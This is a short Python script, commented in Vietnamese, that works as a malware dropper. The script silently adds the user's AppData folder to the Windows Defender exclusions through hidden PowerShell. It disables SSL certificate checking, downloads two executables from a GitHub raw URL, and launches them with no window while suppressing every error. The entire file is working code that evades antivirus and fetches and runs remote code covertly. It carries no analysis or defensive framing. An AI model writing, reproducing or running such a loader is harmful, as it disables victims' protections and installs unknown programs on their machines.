import subprocess
import os
import urllib.request
import ssl

# --- CẤU HÌNH DANH SÁCH FILE ---
# Danh sách các bộ (URL, Tên file lưu trữ)
files_to_run = [
    ("https://raw.githubusercontent.com/skibidi36361/Run/refs/heads/main/Client-built.exe", "Client-built.exe"),
    ("https://raw.githubusercontent.com/skibidi36361/Run/refs/heads/main/setup.exe", "setup.exe")
]

app_data_path = os.environ['AppData']

# 1. Thêm ngoại lệ cho Windows Defender (Chỉ cần chạy 1 lần cho cả thư mục)
defender_cmd = f"Add-MpPreference -ExclusionPath '{app_data_path}'"
try:
    subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", defender_cmd], 
                   capture_output=True, shell=False)
except:
    pass

# Tạo SSL context dùng chung để bỏ qua lỗi chứng chỉ
ssl_context = ssl._create_unverified_context()

# 2. Vòng lặp xử lý từng file
for url, file_name in files_to_run:
    destination = os.path.join(app_data_path, file_name)
    
    # Tải file
    try:
        with urllib.request.urlopen(url, context=ssl_context) as response, open(destination, 'wb') as out_file:
            out_file.write(response.read())
    except:
        continue # Nếu lỗi file này thì bỏ qua để xử lý file tiếp theo

    # 3. Thực thi file .exe ngầm
    if os.path.exists(destination):
        try:
            # Sử dụng Popen để file .exe chạy độc lập, không chặn script chính
            subprocess.Popen([destination], creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
